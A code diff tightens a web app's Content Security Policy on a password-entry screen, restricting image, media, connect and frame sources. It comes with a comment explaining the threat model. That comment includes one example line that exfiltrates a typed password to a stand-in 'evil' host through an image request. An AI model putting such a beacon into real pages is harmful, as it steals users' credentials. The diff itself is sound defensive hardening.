@@ -16,8 +16,36 @@ export function buildContentSecurityPolicy(options: {
   readonly nonce: string;
   readonly realtimeUrl?: string;
   readonly isDevelopment: boolean;
+  /**
+   * ════════════════════════════════════════════════════════════════════════
+   * ★★ A PAGE WHERE SOMEBODY TYPES A PASSWORD GETS A NARROWER POLICY
+   * ════════════════════════════════════════════════════════════════════════
+   * Screen 00a renders a password field in our own bundle, which is a real
+   * change: until now the credential was typed on the identity provider's
+   * origin and an XSS here could not reach it. The architecture's claim is that
+   * **our server** never sees the password — our JavaScript does, and this is
+   * the control that narrows what an injected script could do with it.
+   *
+   * ★ `img-src https:` IS THE ONE THAT MATTERS, and it is easy to miss because
+   *   images feel harmless. `new Image().src = 'https://evil/?p=' + password`
+   *   exfiltrates over a channel `connect-src` does not govern. The general
+   *   policy allows `https:` because the product renders customer avatars and
+   *   product photos from wherever a merchant's shop hosts them. **The sign-in
+   *   screen renders none of that** — its only image is an inline SVG logo — so
+   *   the wildcard buys nothing there and costs the whole exfiltration path.
+   *
+   * `media-src` is the same channel in a different tag. `connect-src` loses the
+   * realtime origins, which are not used before anybody has signed in. And
+   * `frame-src` goes to `none`: an injected iframe is another way to carry a
+   * value off the page.
+   *
+   * ⚠ WHAT THIS DOES NOT DO: it does not stop a script that is already running
+   * in our origin from reading the field. Nothing in a CSP does. It removes the
+   * ways the value leaves, which is the half that is achievable.
+   */
+  readonly credentialSurface?: boolean;
 }): string {
-  const { nonce, realtimeUrl, isDevelopment } = options;
+  const { nonce, realtimeUrl, isDevelopment, credentialSurface = false } = options;
 
   // The realtime gateway is a separate origin, and Socket.IO upgrades to a
   // websocket, so both the https and wss origins have to be allowed.
@@ -38,10 +66,17 @@ export function buildContentSecurityPolicy(options: {
     // there is no nonce mechanism for those. Inline style cannot execute
     // script, so this is a far smaller exposure than inline script would be.
     'style-src': ["'self'", "'unsafe-inline'"],
-    'img-src': ["'self'", 'data:', 'blob:', 'https:'],
+    /*
+     * `https:` because a merchant's product photos and a customer's avatar come
+     * from wherever their shop hosts them, and enumerating that is not possible.
+     * Not on a credential surface, where nothing is rendered from off-origin.
+     */
+    'img-src': credentialSurface ? ["'self'", 'data:'] : ["'self'", 'data:', 'blob:', 'https:'],
     'font-src': ["'self'", 'data:'],
-    'connect-src': ["'self'", ...realtimeOrigins, ...(isDevelopment ? ['ws:'] : [])],
-    'media-src': ["'self'", 'blob:', 'https:'],
+    'connect-src': credentialSurface
+      ? ["'self'"]
+      : ["'self'", ...realtimeOrigins, ...(isDevelopment ? ['ws:'] : [])],
+    'media-src': credentialSurface ? ["'none'"] : ["'self'", 'blob:', 'https:'],
     // No plugins, ever.
     'object-src': ["'none'"],
     // Stops an injected <base> silently repointing every relative URL.
@@ -49,7 +84,7 @@ export function buildContentSecurityPolicy(options: {
     'form-action': ["'self'"],
     // The clickjacking control. Repeated as X-Frame-Options for old browsers.
     'frame-ancestors': ["'none'"],
-    'frame-src': ["'self'"],
+    'frame-src': credentialSurface ? ["'none'"] : ["'self'"],
     ...(isDevelopment ? {} : { 'upgrade-insecure-requests': [] }),
   };
 
